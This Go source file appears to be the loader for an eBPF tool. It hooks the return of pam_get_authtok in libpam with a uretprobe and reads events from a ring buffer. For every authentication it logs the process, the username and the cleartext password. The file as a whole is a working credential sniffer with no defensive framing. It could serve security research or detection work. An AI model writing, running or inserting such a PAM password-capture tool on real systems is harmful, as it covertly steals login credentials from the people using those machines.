//go:build amd64

package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"flag"
	"log"
	"os"
	"os/signal"
	"syscall"
	"unsafe"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

//go:generate ../../gen.sh

const (
	defaultBinPath = "/lib/x86_64-linux-gnu/libpam.so.0"
	defaultSymbol  = "pam_get_authtok"
)

type eventT struct {
	Pid      int32
	Comm     [16]byte
	Username [80]byte
	Password [80]byte
}

func byteArrayToString(b []byte) string {
	n := -1
	for i, v := range b {
		if v == 0 {
			n = i
			break
		}
	}
	if n == -1 {
		n = len(b)
	}
	return string(b[:n])
}

func parseEventData(data []byte) *eventT {
	var event eventT

	if len(data) >= int(unsafe.Sizeof(eventT{})) {
		if err := binary.Read(bytes.NewReader(data), binary.LittleEndian, &event); err == nil {
			return &event
		}
	}

	return nil
}

func main() {
	// flags
	var (
		binPath string
		symbol  string
	)
	flag.StringVar(&binPath, "binPath", "", "Path to the binary")
	flag.StringVar(&symbol, "symbol", "", "Symbol to target")
	flag.Parse()

	if binPath == "" {
		binPath = defaultBinPath
	}
	if symbol == "" {
		symbol = defaultSymbol
	}
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatal(err)
	}

	objs := bpfObjects{}
	if err := loadBpfObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %s", err)
	}
	defer func() {
		log.Println("closing objs")
		objs.Close()
	}()

	ex, err := link.OpenExecutable(binPath)
	if err != nil {
		log.Fatalf("opening executable: %s", err)
	}

	up, err := ex.Uretprobe(symbol, objs.TracePamGetAuthtok, nil)
	if err != nil {
		log.Fatalf("creating uretprobe: %s", err)
	}
	defer up.Close()

	log.Printf("Listening for events..")

	rb, err := ringbuf.NewReader(
		objs.Rb,
	)
	if err != nil {
		log.Printf("failed to open ring buffer reader: %v", err)
	}
	defer func() {
		log.Println("closing ring buffer")
		rb.Close()
	}()

	go func() {
		var record ringbuf.Record
		for {
			log.Println("reading ringbuffer")
			record, err = rb.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					log.Println("The ring buffer was closed, likely because the program is exiting.")
					return
				}
				log.Printf("error reading from ring buffer: %v", err)
				continue
			}

			event := parseEventData(record.RawSample)
			if event == nil {
				log.Println("Failed to parse event data. Printing raw data:")
				log.Println(string(record.RawSample))
				continue
			}

			log.Printf("Event: PID: %d, Comm: %s, Username: %s, Password: %s",
				event.Pid,
				byteArrayToString(event.Comm[:]),
				byteArrayToString(event.Username[:]),
				byteArrayToString(event.Password[:]))
		}
	}()

	<-stopper
	log.Println("Received signal, exiting program..")

	if err = rb.Close(); err != nil {
		log.Fatalf("closing ringbuf reader: %s", err)
	}
}
